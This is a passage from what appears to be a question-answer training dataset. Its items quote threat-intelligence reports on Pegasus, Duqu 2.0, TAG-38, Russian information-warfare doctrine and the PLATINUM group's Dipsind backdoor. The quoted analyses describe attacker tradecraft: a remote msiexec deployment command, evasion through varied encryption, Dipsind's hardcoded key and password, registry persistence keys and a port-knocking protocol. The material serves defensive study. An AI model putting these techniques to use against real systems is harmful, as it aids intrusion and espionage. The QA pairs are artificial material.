    "instruction": "Big Headline: 1. Executive Summary\nAhmed Mansoor is an internationally recognized human rights defender, based in the United Arab Emirates (UAE), and recipient of the (<https://www.amnesty.org/en/latest/news/2015/10/ahmed-mansoor-selected-as-the-2015-laureate-martin-ennals-award-for-human-rights-defenders/>)Martin Ennals Award (sometimes referred to as a \"(<http://www.lemonde.fr/asie-pacifique/article/2008/11/24/le-combat-de-mutabar-tadjibaeva-survivante-des-geoles-de-tachkent_1122352_3216.html>)Nobel Prize for human rights\"). On August 10 and 11, 2016, Mansoor received SMS text messages on his iPhone promising \"new secrets\" about detainees tortured in UAE jails if he clicked on an included link. Instead of clicking, Mansoor sent the messages to Citizen Lab researchers. We recognized the links as belonging to an exploit infrastructure connected to NSO Group, an Israel-based \"cyber war\" company that sells Pegasus, a government-exclusive \"lawful intercept\" spyware product. NSO Group is reportedly owned by an American venture capital firm, Francisco Partners Management.\nThe ensuing investigation, a collaboration between researchers from Citizen Lab and from Lookout Security, determined that the links led to a chain of (<https://en.wikipedia.org/wiki/Zero-day_(computing)>)zero-day exploits (\"zero-days\") that would have remotely (<https://en.wikipedia.org/wiki/IOS_jailbreaking?>)jailbroken Mansoor's stock iPhone 6 and installed sophisticated spyware. We are calling this exploit chain Trident. Once infected, Mansoor's phone would have become a digital spy in his pocket, capable of employing his iPhone's camera and microphone to snoop on activity in the vicinity of the device, recording his WhatsApp and Viber calls, logging messages sent in mobile chat apps, and tracking his movements.\nWe are not aware of any previous instance of an iPhone remote jailbreak used in the wild as part of a targeted attack campaign, making this a rare find.\nQuestion: How did Ahmed Mansoor manage to avoid falling victim to the NSO Group's Pegasus spyware, and what specific actions did Citizen Lab and Lookout Security take to investigate the incident?",
    "output": "Answer: Ahmed Mansoor avoided falling victim to the NSO Group's Pegasus spyware by not clicking on the suspicious SMS links he received on August 10 and 11, 2016. Instead, he forwarded these messages to Citizen Lab researchers. Upon recognizing the links as part of an exploit infrastructure connected to NSO Group, Citizen Lab collaborated with Lookout Security to investigate further. Their joint investigation revealed that the links led to a chain of zero-day exploits known as 'Trident.' These exploits were designed to remotely jailbreak Mansoor's iPhone 6 and install sophisticated spyware, which could have turned his phone into a digital spy capable of accessing his camera, microphone, WhatsApp and Viber calls, mobile chat messages, and tracking his movements.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: LATERAL MOVEMENT\nIn general, once the attackers gain access into a network, two phases follow:\n\u2022 Reconnaissance and identification of network topology\n\u2022 Lateral movement\nIn the case of Duqu 2.0, the lateral movement technique appears to have taken advantage of another zero-day, (CVE-2014-6324) which was patched in November 2014 with 5MS14-068 . This exploit allows an unprivileged domain user to elevate credentials to a domain administrator account. Although we couldn't retrieve a copy of this exploit, the logged events match the Microsoft detection guidance for this attack. Malicious modules were also observed performing a \"pass the hash\" attack inside the local network, effectively giving the attackers many different ways to do lateral movement.\nOnce the attackers gained domain administrator privileges, they can use these permissions to infect other computers in the domain.\nTo infect other computers in the domain, the attackers use few different strategies. In most of the attacks we monitored, they prepare Microsoft Windows Installer Packages (MSI) and then deploy them remotely to other machines. To launch them, the attackers create a service on the target machine with the following command line:\nmsiexec.exe /i \"C:\\\\[\u2026]\\tmp8585e3d6.tmp\" /q PROP=9c3c7076-d79f-4c\n4\n5\nThe PROP value above is set to a random 56-bit encryption key that is required to decrypt the main payload from the package. Other known names for this parameter observed in the attacks are \"HASHVA\" and \"CKEY\". The folder where the package is deployed can be different from case to case, depending on what the attackers can access on the remote machine.\nIn addition to creating services to infect other computers in the LAN, attackers can also use the Task Scheduler to start \"msiexec.exe\" remotely. The usage of Task Scheduler during Duqu infections for lateral movement was also observed with the 2011 version and was described by  6Symantec in their technical analysis.\n\"msiexec.exe\" - Task Scheduler trace in the logs\nThe MSI files used in the attacks contain a malicious stub inside which serves as a loader. The stub loads the other malware resources right from the MSI file and decrypts them, before passing execution to the decrypted code in memory.\nMalicious stub with query to load the other resources from the MSI file highlighted.\nThe encryption algorithms used for these packages differ from case to case. It's important to point out that the attackers were careful enough to implement unique methods, encryption algorithms and names (such as file names) for each attack, as a method to escape detection from security products and limit the ability of an antivirus company to find other infections once one of them has been identified.\nSo far, we've seen the following encryption algorithms used by the attackers:\n\u2022 Camellia\n\u2022 AES\n\u2022 XTEA\n\u2022 RC4\n\u2022 Different multibyte XOR-based encryption\n6\nFor compression algorithms, we've seen the following:\n\u2022 LZJB\n\u2022 LZF\n\u2022 FastLZ\n\u2022 LZO\nIn essence, each compiled attack platform uses a unique combination of algorithms that make it very difficult to detect.\nThe attackers can deploy two types of packages to their victims:\n\u2022 \"Basic\", in-memory remote backdoor (~500K)\n\u2022 Fully featured, C&C-capable, in-memory espionage platform (18MB)\nThese have similar structures and look like the following:\nMalicious Duqu 2.0 MSI package.\nIn the screenshot above, one can see the loader (ActionDll: 17,920 bytes) and the main payload (ActionData0: 476,736 bytes). Upon execution, ActionDll is loaded and control is passed to its only export, StartAction.\nThe \"basic\" in-memory remote backdoor is pushed to computers inside the domain by the Domain Controller on a regular basis \u2013 almost like a worm infection. This gives the attackers an entry into most of the machines from the domain and if further access is needed, they can upload a more sophisticated MSI file that deploys tens of different plugins to harvest information.\nA thorough description of the malware loading mechanism from the \"basic\" remove backdoor MSI can be found below.\nMedium Headline: File properties\nThe MSI file has the following general properties:\n\u2022 Composite Document File V2 Document\n\u2022 Little Endian\n\u2022 OS: Windows, Version 6.1\n\u2022 Code page: 1252\n\u2022 Title: {7080A304-67F9-4363-BBEB-4CD7DB43E19D} (randomly generated GUIDs)\n\u2022 Subject: {7080A304-67F9-4363-BBEB-4CD7DB43E19D}\n\u2022 Author: {7080A304-67F9-4363-BBEB-4CD7DB43E19D}\n\u2022 Keywords: {7080A304-67F9-4363-BBEB-4CD7DB43E19D}\n\u2022 Comments: {7080A304-67F9-4363-BBEB-4CD7DB43E19D}\n\u2022 Template: Intel;1033\n\u2022 Last Saved By: {7080A304-67F9-4363-BBEB-4CD7DB43E19D}\n\u2022 Revision Number: {4ADA4205-2E5B-45B8-AAC2-D11CFD1B7266}\n\u2022 Number of Pages: 100\n\u2022 Number of Words: 8\n\u2022 Name of Creating Application: Windows Installer XML (3.0.5419.0)\n\u2022 Security: 4\nIt should be noted that MSI files used in other attacks can have different other properties. For example, we observed several other fields:\n\u2022 Vendor: Microsoft or InstallShield\n\u2022 Version: 1.0.0.0 or 1.1.2.0 or 2.0.0.0\nSome of these are visible via the Windows Explorer file properties dialog box:\nThere are two binary blocks inside this MSI package:\nThe first binary, called ActionDll, is in fact a Windows PE DLL file, while the other one is a Camellia-encrypted and LZJB-compressed data payload (the encryption and compression algorithm vary from case to case). In fact, there are several layers of executable code embedded one into another as compressed or encrypted binary blocks. Here's a look at a Duqu 2.0 MSI package, with all its internal payloads:\nWe describe these components in more detail below.\nMedium Headline: First Layer: ActionDLL (msi.dll)\nOriginal filename: msi.dll\nMD5: e8eaec1f021a564b82b824af1dbe6c4d\nSize: 17'920 bytes\nLink time: 2004.02.12 02:04:50 (GMT)\nType: 64-bit PE32+ executable DLL for MS Windows\nThis DLL has only one export name called StartAction, which is called in the context of msiexec.exe process. When this function is called, it retrieves an MSI property called PROP and uses it as a decryption key for the bundled ActionData0 package:\nNext, the code iterates over 12 possible payloads that have to be decrypted and started. The payloads are part of the MSI and may have the following names: ActionData0, ActionData1, ActionData2, etc.\nThe package described here contains only one payload named \"ActionData0\".\nMedium Headline: Second Layer: ActionData0\nThis binary chunk contains the main code, in compressed and encrypted format. It represents a composition of executable, position-independent code blocks mixed with embedded data objects. The code seems to be based on a framework and heavily uses helper structures that contain pointers to a set of system APIs and offsets to internal data blocks. Such structures are definitely a trademark of the developer. When they are initialized, one field (usually the first 4 bytes) contains a magic value that identifies the state and type of the structure.\nAnother trademark of the coder is the way to import system API by module and export name hashes. The hashing algorithm was found all over this and other layers of executable code. It's easily recognizable by two DWORD constants: 0x8A20C27 and 0x67F84FC6.\nBasically, the code in ActionData0 passes execution to an embedded executable, which we will refer by its internal name: \"klif.dll\". The execution is passed to the second exported function in table of exports of this DLL file. This disregards the export name and relies only on the order of functions in the table of PE export ordinals. When this export function is called, a next stage helper structure pointer is passed to it, so that it can use some of the values set on the upper layer.\nHowever, before passing execution to klif.dll, the code attempts alternative routes. First, it attempts to find the name of the following format \"api-ms-win-shell-XXXX. dll\", where \"X\" can be any decimal number. The name is valid if there is no module with such filename loaded into current process. The code attempts to iteratively find such name starting from api-ms-win-shell-0000.dll, api-ms-win-shell-0001.dll, api-ms-win-shell-0002.dll and so on. This may be a dependency to the Duqu platform component that is yet to be discovered.\nRight after this, if the name was found, the code attempts to map a section kernel object by name, which is generated using a PRNG-based algorithm. The name of the section has the following template: \"\\BaseNamedObjects\\{XXXXXXXX-XXXX-XXXX-XXXXXXXXXXXX}\", where \"X\" is any hexadecimal digit that is generated based on current system boot time. So far, the name of the section is \"machine/boot time\" dependent, which makes it unique but allows other processes of modules to locate such section if they use the same name generation algorithm. This section is accessed in different other parts of the code and modules. Lets refer to this section as OSBoot-section from now. Once the section name is generated the code tries to open such section and, if it is found, it takes some values from it and attempts to open a specific device and issue a number of IOCTL codes to the driver. The name of the driver device as well as IOCTL codes are located inside a section of the kernel mode driver KMART.dll that is described below.\nThe code developer has a preference for using sections to any other ways to access data. Another use of sections appears to be in mapping the part of code/data where klif.dll is embedded and then finding that section using a hardcoded magic QWORD number: 0xA1B5F8FC0C2E1064. Once the section is found in address space of current process the code attempts to pass execution to it.  This alternative execution route is not applicable to current MSI file package but simply exists in the code probably due to common code template used for building current MSI package. It may also be an indicator of another Duqu platform component that wasn't used in the attacks that we observed.\n\nAnswer this question based on the above context: How did the Duqu 2.0 attackers ensure that their malware remained undetected and difficult to analyze? Discuss the methods they employed.",
    "output": "The Duqu 2.0 attackers ensured their malware remained undetected by implementing unique methods, encryption algorithms, and names for each attack. They used various encryption algorithms like Camellia, AES, XTEA, RC4, and different multibyte XOR-based encryption, along with compression algorithms such as LZJB, LZF, FastLZ, and LZO. Each compiled attack platform used a unique combination of these algorithms, making it very difficult to detect. Additionally, the attackers were careful to use different file names and properties for each attack, limiting the ability of antivirus companies to find other infections once one was identified.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Mitigations\nWe recommend that users conduct the following measures to detect and mitigate activity associated with TAG-38 activity:\n\u2022 Configure your intrusion detection systems (IDS), intrusion prevention systems (IPS), or any network defense mechanisms in place to alert on \u2014 and upon review, consider blocking connection attempts to and from \u2014 the external IP addresses and domains listed in the appendix.\n\u2022 Recorded Future proactively detects and logs malicious server configurations in the Command and Control Security Control Feed. The Command and Control list includes tools used by TAG-38 and Chinese state-sponsored threat activity groups, such as ShadowPad. Recorded Future clients should alert on and block these C2 servers to allow for detection and remediation of active intrusions.\n\u2022 Monitor for consistent anomalous outbound traffic from your network to unusual servers, such as compromised DVR/IP camera systems in this case, which may be indicative of malware beaconing activity.\n\u2022 Ensure software and firmware associated with IOT devices, such as DVR/IP camera systems, are kept up to date. Always change any default passwords to a strong, complex password and turn on two-factor authentication (2FA) if available. Where possible, avoid exposing these devices directly to the internet.\n\u2022 Recorded Future Threat Intelligence, Third-Party Intelligence, and SecOps Intelligence  users can monitor real-time output from network traffic analysis analytics to identify suspected targeted intrusion activity involving your organization or key vendors and partners.\nBig Headline: Outlook\nRecorded Future continues to track Chinese state-sponsored activity groups targeting a wide variety of sectors globally. A large majority of this conforms to longstanding cyber espionage efforts, such as targeting of foreign governments, surveillance of dissident and minority groups, and economic espionage. However, the coordinated effort to target Indian power grid assets in recent years is notably distinct from our perspective and, given the continued heightened tension and border disputes between the two countries, we believe is a cause for concern.\nBased on the complexity present across national critical infrastructure systems, this often necessitates lengthy reconnaissance operations to better understand the inner workings of these systems, both in a technological and a physical sense. This is reflected in publicly documented targeted intrusion activity targeting industrial control system (ICS) networks historically, which can often years. At this time, we have not identified evidence of compromise of ICS networks by TAG-38 operators from our visibility, although we cannot discount this possibility. Given the prolonged targeting of both SLDCs and RLDCs within India, first from RedEcho and now in this latest TAG-38 activity, we believe this targeting is a strategic priority for these actors and is likely to continue.\nBig Headline: Appendix A \u2014 Indicators\nReaders can access the indicators listed below in our public Insikt Group Github repository: (Continued Targeting of Indian Power Grid Assets by China State-sponsored Activity Group - March 2022).\nNote: We have observed a portion of the compromised infrastructure listed below indiscriminately scanning the internet outside of the First Seen/Last Seen dates associated with TAG-38 activity. Careful consideration should be given to these dates when analyzing any communications to these network indicators within your environment. The malicious activity described in this report consists of consistent long-term outbound network traffic to these nodes indicative of malware beaconing, not inbound scanning or brute forcing activity.\nMedium Headline: About Recorded Future\u00ae\nRecorded Future is the world's largest intelligence company. The Recorded Future Intelligence Platform provides the most complete coverage across adversaries, infrastructure, and targets. By combining persistent and pervasive automated data collection and analytics with human analysis, Recorded Future provides real-time visibility into the vast digital landscape and empowers clients to take proactive action to disrupt adversaries and keep their people, systems, and infrastructure safe. Headquartered in Boston with offices and employees around the world, Recorded Future works with more than 1,300 businesses and government organizations across 60 countries.\nLearn more at recordedfuture.com and follow us on Twitter at @RecordedFuture.\nRead the text above and answer this question: Why is it crucial to configure IDS and IPS systems to alert on and potentially block connections to external IP addresses and domains associated with TAG-38? What specific tool used by TAG-38 should be particularly monitored?",
    "output": "Configuring IDS and IPS systems to alert on and potentially block connections to external IP addresses and domains associated with TAG-38 is crucial because it helps in detecting and mitigating the activity of TAG-38. Specifically, monitoring for tools like ShadowPad, which is used by TAG-38 and other Chinese state-sponsored threat activity groups, is essential. Recorded Future's Command and Control Security Control Feed proactively detects and logs malicious server configurations, including those used by ShadowPad, allowing for the detection and remediation of active intrusions.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 2 Information Security and Cyber Security in Russian Military Theory\nIn Russian government and academic circles, information is understood to be a form and source of great power. This was true well before the advent of the internet and cyberspace \u2013 which have not changed Russian IW strategy, but only its tactics.\nIn the West, cyber security and information security are considered to be two different things. In Russia, however, cyber is subordinate to information security, which allows national security planners to oversee both technical data (e.g. the integrity of password files) and cognitive data (e.g. political information on websites). Thus, any information found on the World Wide Web could be a 'missile' fired at Russia that is more dangerous than a typical cyber attack as currently understood in the West.\nThe logical consequence of this Russian perspective is to define and to protect the borders of the Russia's 'information space' (\u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u043e\u043d\u043d\u043e\u0435 \u043f\u0440\u043e\u0441\u0442\u0440\u0430\u043d\u0441\u0442\u0432\u043e), and this philosophy is to be found easily in Russian doctrines, strategies, and activities both at home and abroad \u2013 including in Ukraine.\nFor example, Russia's National Security Strategy 2020 states that 'nationalist, separatist, radical religion' is a danger to nation-states, and that a 'global information struggle' is now intensifying. The document proposes to counter this threat by disseminating 'truthful' information to Russian citizens, including via the promotion of native internet platforms encompassing social media.4\nInformation superiority in cyberspace is an essential goal.\nAs for the importance of cyberspace, numerous official documents describe computer network operations as an integral part of Russian information security, including: Information Security Doctrine of the Russian Federation, 5 Conceptual Views Regarding the Activities of the Armed Forces of the Russian Federation in the Information Space, 6 and\nBasic Principles for State Policy of the Russian Federation in the Field of International Information Security. 7\nAcademic discourse within the Russian military is similar. From a historical perspective, progress in computer science has wrought a new generation of warfare in which the achievement of information superiority in cyberspace is an essential goal. Within any desired zone of influence, this includes attacks against and defence of\nboth technical data and cognitive information, as well as and psychological operations, or PSYOPS.\n4 Security Council of the Russian Federation. \u0421\u0442\u0440\u0430\u0442\u0435\u0433\u0438\u044f \u043d\u0430\u0446\u0438\u043e\u043d\u0430\u043b\u044c\u043d\u043e\u0439 \u0431\u0435\u0437\u043e\u043f\u0430\u0441\u043d\u043e\u0441\u0442\u0438 \u0420\u043e\u0441\u0441\u0438\u0439\u0441\u043a\u043e\u0439 \u0424\u0435\u0434\u0435\u0440\u0430\u0446\u0438\u0438 \u0434\u043e 2020 \u0433\u043e\u0434\u0430. (National Security Strategy to 2020) (Moscow, 2009).\n5 Security Council of the Russian Federation. 2000. \u0414\u043e\u043a\u0442\u0440\u0438\u043d\u0430 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u043e\u043d\u043d\u043e\u0439 \u0431\u0435\u0437\u043e\u043f\u0430\u0441\u043d\u043e\u0441\u0442\u0438 \u0420\u043e\u0441\u0441\u0438\u0439\u0441\u043a\u043e\u0439 \u0424\u0435\u0434\u0435\u0440\u0430\u0446\u0438\u0438. (Information Security Doctrine of the Russian Federation.) (Moscow, 2000).\n6 Ministry of Defence of the Russian Federation. \u041a\u043e\u043d\u0446\u0435\u043f\u0442\u0443\u0430\u043b\u044c\u043d\u044b\u0435 \u0432\u0437\u0433\u043b\u044f\u0434\u044b \u043d\u0430 \u0434\u0435\u044f\u0442\u0435\u043b\u044c\u043d\u043e\u0441\u0442\u044c \u0412\u043e\u043e\u0440\u0443\u0436\u0435\u043d\u043d\u044b\u0445 \u0421\u0438\u043b \u0420\u043e\u0441\u0441\u0438\u0439\u0441\u043a\u043e\u0439 \u0424\u0435\u0434\u0435\u0440\u0430\u0446\u0438\u0438 \u0432 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u043e\u043d\u043d\u043e\u043c \u043f\u0440\u043e\u0441\u0442\u0440\u0430\u043d\u0441\u0442\u0432\u0435. (Conceptual Views Regarding the Activities of the Armed Forces of the Russian Federation in the Information Space) (Moscow, 2011).\n7 Security Council of the Russian Federation. \u041e\u0441\u043d\u043e\u0432\u044b \u0433\u043e\u0441\u0443\u0434\u0430\u0440\u0441\u0442\u0432\u0435\u043d\u043d\u043e\u0439 \u043f\u043e\u043b\u0438\u0442\u0438\u043a\u0438 \u0420\u043e\u0441\u0441\u0438\u0439\u0441\u043a\u043e\u0439 \u0424\u0435\u0434\u0435\u0440\u0430\u0446\u0438\u0438 \u0432 \u043e\u0431\u043b\u0430\u0441\u0442\u0438 \u043c\u0435\u0436\u0434\u0443\u043d\u0430\u0440\u043e\u0434\u043d\u043e\u0439 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u043e\u043d\u043d\u043e\u0439 \u0431\u0435\u0437\u043e\u043f\u0430\u0441\u043d\u043e\u0441\u0442\u0438 \u043d\u0430 \u043f\u0435\u0440\u0438\u043e\u0434 \u0434\u043e 2020 \u0433\u043e\u0434\u0430. (Basic Principles for State Policy of the Russian Federation in the Field of International Information Security to 2020.) (Moscow, 2013).\nMaj. Gen. (R) Ivan Vorobyev and Col. (R) Valery Kiselyov have written that information is 'not just an addition to firepower, attack, manoeuvre, but transforms and unites all of these'. 8  Col. (R) Sergei Chekinov and Lt. Gen. (R) Sergei Bogdanov go even further: 'Today the means of information influence reached such perfection that they can tackle strategic tasks'. 9\nInformation can disorganise governance, delude adversaries and reduce an opponent's will to resist.\nCheckinov and Bogdanov point out \u2013 in the aftermath of the annexation of Crimea and the current destabilisation of Ukraine \u2013 that information can be used to disorganise governance, organise anti-government protests, delude adversaries, influence public opinion, and reduce an opponent's will to resist. Furthermore, it is critical that such activities begin prior to the onset of traditional military operations.10\nAt least since Soviet times, Russia considers itself to be a victim of IW, engaged in a battle between the 'historical Russian world' (of which Ukraine is a part) and the West where the US is its principal antagonist.11 Professor Igor Panarin has described a 'first information war' during the Cold War that resulted in the demise of the Soviet Union. Today, he sees an 'Operation ANTI-PUTIN' modelled on an earlier 'Operation ANTI-STALIN'. He contends that Western IW was behind both the Arab Spring12 and Euromaidan, and that WikiLeaks' Julian Assange is an agent of the British MI6.13 Panarin believes there is a 'second information war' taking place against countries such as Russia and Syria which began at least by the time of the Russo-Georgian war in 2008.14 Russian President Vladimir Putin has characterised the rift between Russia and the West as an incompatibility of values (\u00ab\u0434\u0443\u0445\u043e\u0432\u043d\u044b\u0435 \u0446\u0435\u043d\u043d\u043e\u0441\u0442\u0438\u00bb).15\nPanarin is far from being the only contemporary Russian military thinker arguing this line. A group of five authors recently wrote in Russia's Military Thought that 'The NATO countries led by the US \u2026 have set up a powerful information operations (IO) system and are going on expanding and improving it'. 16\n8 Vorobyov and Kiseljov 'Russian Military Theory: Past and Present.' Military Thought, 2013 (3).\n9 Sergei G. Checkinov and Sergei A. Bogdanov. 'Asymmetrical Actions to Maintain Russia's Military Security.' Military Thought, 2010 (1).\n10 Sergei G. Checkinov and Sergei A. Bogdanov. 'The Art of War in the Early 21st Century: Issues and Opinions.' Military Thought, 2015 (24).\n11 Igor Panarin. \u0418\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u043e\u043d\u043d\u0430\u044f \u0432\u043e\u0439\u043d\u0430 \u0438 \u043a\u043e\u043c\u043c\u0443\u043d\u0438\u043a\u0430\u0446\u0438\u0438. (Information warfare and communications.). Moskva, Russia: Goryachaya Liniya \u2013 Telekom, 2014a.\n12 Ibid.\n13 Igor Panarin. Posting on Facebook , 29 June, 2014b. (<http://www.facebook.com/permalink.php?story_fbid=487886764691548&id=100004106865632&fref=ts>)http://www.facebook.com/permalink.php?story_fbid=487886764691548 (<http://www.facebook.com/permalink.php?story_fbid=487886764691548&id=100004106865632&fref=ts>)&id=100004106865632&fref=ts. Accessed 19 December, 2014.\n14 Igor Panarin. 2014a.\n15 Vladimir Putin. '\u041f\u0443\u0442\u0438\u043d \u0437\u0430\u0449\u0438\u0442\u0438\u0442 \u0442\u0440\u0430\u0434\u0438\u0446\u0438\u043e\u043d\u043d\u044b\u0435 \u0441\u0435\u043c\u0435\u0439\u043d\u044b\u0435 \u0446\u0435\u043d\u043d\u043e\u0441\u0442\u0438. (Putin to defend traditional family values).' Vesti, 12 December, 2013a. (<http://www.vesti.ru/doc.html?id=1166423>)http://www.vesti.ru/doc.html?id=1166423; Vladimir Putin. '\u041d\u0430\u0448\u0438 \u0434\u0443\u0445\u043e\u0432\u043d\u044b\u0435 \u0446\u0435\u043d\u043d\u043e\u0441\u0442\u0438 \u0434\u0435\u043b\u0430\u044e\u0442 \u043d\u0430\u0441 \u0435\u0434\u0438\u043d\u044b\u043c \u043d\u0430\u0440\u043e\u0434\u043e\u043c' (Our values unite us as peoples. Speech in Kyiv 27.07.2013.). YouTube, 2013b. (<https://www.youtube.com/watch?v=YW1WYh_gvJg>)https://www.youtube.com/ (<https://www.youtube.com/watch?v=YW1WYh_gvJg>)watch?v=YW1WYh_gvJg Accessed 20 December 2014.\n16 Dylevski, I.N., Elyas, V.P., Komov, S.A., Petrunin, A.N. & Zapivakhin V.O.'Political and Military Aspects of the Russian Federation's State Policy on International Information Security.' Military Thought, 2015 (24).\nEven Russia, however, is not a monolith.17 Some military scholars have criticised the prevailing view and have suggested that a distinction should be drawn between attacks on technical and cognitive data, detailing a 'technospheric war' largely corresponding to the Western perception of 'cyber war'. 18 Similarly, a publicly available draft of the next Cyber Security Strategy of the Russian Federation problematises the difference between the Russian and the Western views on the matter, suggesting that cyber security and information security be treated as distinct challenges. However, to date these remain unimplemented proposals.\nRead the text above and answer this question: How does Russia perceive itself in the context of information warfare, and what historical events have shaped this perspective?",
    "output": "Russia considers itself a victim of information warfare, engaged in a battle between the 'historical Russian world' and the West, with the US as its principal antagonist. This perspective dates back to Soviet times and includes events like the Cold War, which Professor Igor Panarin describes as the 'first information war' leading to the demise of the Soviet Union. Panarin also sees a 'second information war' beginning with the Russo-Georgian war in 2008, targeting countries like Russia and Syria. Russian President Vladimir Putin has characterized the rift between Russia and the West as an incompatibility of values.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: INITIAL ATTACK\nThe initial attack against Kaspersky Lab began with the targeting of an employee in one of our smaller APAC offices. The original infection vector for Duqu 2.0 is currently unknown, although we suspect spear-phishing e-mails played an important role. This is because for one of the patients zero we identified had their mailbox and web browser history wiped to hide traces of the attack. Since the respective machines were fully patched, we believe a zero-day exploit was used.\nIn 2011, we were able to identify Duqu attacks that used Word Documents containing an exploit for a zero-day vulnerability (CVE-2011-3402) that relied on a malicious embedded TTF (True Type Font File). This exploit allowed the attackers to jump directly into Kernel mode from a Word Document, a very powerful, extremely rare, technique. A similar technique and zero-day exploit ( 4CVE-2014-4148) appeared again in June 2014, as part of an attack against a prominent international organization. The C&C server used in this 2014 attack as well as other factors have certain similarities with Duqu, however, the malware is different from both Duqu and Duqu 2.0. It is possible that this is a parallel project from the Duqu group and the same zero-day (CVE-2014-4148) might have been used to install Duqu 2.0.\nOnce the attackers successfully infected one machine, they moved on to the next stage.\n\nQuestion: How did the Duqu 2.0 attackers manage to escalate privileges from a user-mode application to kernel mode, and what specific techniques or vulnerabilities were likely involved?\n\nAnswer:",
    "output": "The Duqu 2.0 attackers likely managed to escalate privileges from a user-mode application to kernel mode using a zero-day exploit. In 2011, Duqu attacks utilized Word Documents containing an exploit for a zero-day vulnerability (CVE-2011-3402) that relied on a malicious embedded TTF (True Type Font File). This exploit allowed the attackers to jump directly into Kernel mode from a Word Document, a very powerful and extremely rare technique. A similar technique and zero-day exploit (CVE-2014-4148) appeared again in June 2014, as part of an attack against a prominent international organization. The C&C server used in this 2014 attack, as well as other factors, had certain similarities with Duqu, suggesting that the same zero-day (CVE-2014-4148) might have been used to install Duqu 2.0.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Dipsind\nPLATINUM uses a number of different custom-developed backdoors to communicate with infected computers. The lack of any significant evidence of shared code between any of these backdoor families is another clue as to the scope of the resources on which the activity group is able to draw, and the precautions the group is willing and able to take in order to avoid losing its ability to conduct its espionage operations.\nThe group's most frequently used backdoors belong to a malware family that Microsoft has designated Dipsind, although some variants are detected under different names. Multiple Dipsind variants have been identified, all of which are believed to be used exclusively by PLATINUM.\nThe first variant, (<https://www.microsoft.com/security/portal/threat/encyclopedia/Entry.aspx?Name=Win32/Dipsind.A!dha>)Win32/Dipsind.A!dha, is a lightweight application providing backdoor access to remote attackers. It can be customized for every victim to ensure that it remains undetected in targeted networks. It supports a small set of instructions that allow the attacker to perform basic functions, such as uploading or downloading files and spawning remote shells.\nFigure 11. Sample configuration file for Win32/Dipsind.A\nEach Dipsind file contains an embedded encrypted configuration file that acts as a control for the backdoor. This configuration file also includes the initial command and control (C&C) location the Dipsind backdoor uses in addition to the pollcommandsite variable which references a URL where additional backup C&Cs can be polled. Configurable parameters include instructions on where Dipsind should install a copy of cmd.exe for spawning a remote shell, depending on the user's privileges, the hours during which the backdoor should function, and exfiltrate information. This capability allows the backdoor to confine its activities to normal working hours, making its communications harder to distinguish from normal network traffic.\nDipsind has been observed using a combination of IP addresses and domains for its C&C infrastructure. The domains are a mix of registered domains and free subdomains obtained through dynamic DNS providers. Collected data showed that a vast majority of victim networks allowed unfiltered access to the dynamic DNS hosts. The hosts and domains are hosted on compromised infrastructure based in several different countries, some within academic institutions. In some cases, the backdoors are configured to connect to IP addresses instead of domain names. These factors make it challenging to locate the activity group's infrastructure.\nFigure 12. Some of the domains and addresses used by PLATINUM\nAfter Dipsind.A is installed on the victim's computer, it connects to its C&C server for authentication. All network traffic is over HTTP, base64 encoded, with the underlying data encrypted using AES256 in ECB mode. Authentication is a five-step process, as shown in the following figure:\nFigure 13. Win32/Dipsind.A initial communication protocol (as decrypted)\nAnalysis of several samples of this variant show exactly the same AES key (AOPSH03SK09POKSID7FF674PSLI91965) in use since 2009. The initial HTTP POST made by this backdoor appears as \"ud7LDjtsTHe2tWeC8DYo8A**\", which translates to a simple whitespace. This sequence makes a simple network indicator usable by defenders.\nA second Dipsind variant registers as a Winlogon Event Notify DLL. This backdoor contains a minimized feature list from the original Dipsind variant, and supports a more limited number of commands.\nIt sets the following registry keys in the HKEY_LOCAL_MACHINE hive for persistence and functionality:\n\u2022 SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\Cscdll32\\Asynchronous\n\u2022 SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\Cscdll32\\DllName\n\u2022 SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\Cscdll32\\Impersonate\n\u2022 SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\Cscdll32\\Startup\n\u2022 SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\Cscdll32\\shutdown\n\u2022 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\cscdll32\nThere are at least two additional minor versions of this variant, each of which show improvements in command implementation.\nOne interesting feature of this variant is the way it implements a mechanism similar to port knocking to allow remote attackers to connect to a compromised computer without leaving any connection open for too long. The sequence of events is as follows:\n1. The backdoor is installed via an exploit.\n2. The backdoor sets a registry key to open a specific UDP port through the local firewall, if any, and listens to the port for incoming traffic.\n3. At a remote location, the attacker executes a tool (called PK2 here, although the actual name of the tool is unknown) using the following parameters:\nwhere the IP address is that of the computer with the backdoor, the UDP port is the one specified by the backdoor, and the password is a string encrypted by the tool before being sent.\n4. The backdoor receives the UDP packets, and then checks to see if the password is valid.\n5. If the password is indeed valid, the backdoor will wait for exactly 20 seconds and only then open the PK2 specified TCP port for a window of 3 seconds.\nFigure 14. How the Dipsind knocker component communicates with an attacker\nPK2 is also designed to connect to such open TCP ports and act as a console client for issuing commands to the backdoor. When running PK2 as a console client, the attacker needs to re-enter the password to authenticate a second time against the backdoor, and issue commands such as #sz to upload a file and #rz to download a file. During this research, one such collection of tools was obtained that had the password set to \"t@ng0p@ss\". All communication used by this backdoor and PK2 is encrypted. If a connection from PK2 is not received within the 3-second window, the TCP port is shut and PK2 would need to reinitialize the port-knocking process.\nVery Small Headline: JPIN\nIn addition to Dipsind and its variants, PLATINUM uses a few other families of custom-built backdoors within its attack toolset. These families of backdoors are significantly different in their capabilities and have completely different code bases. While one 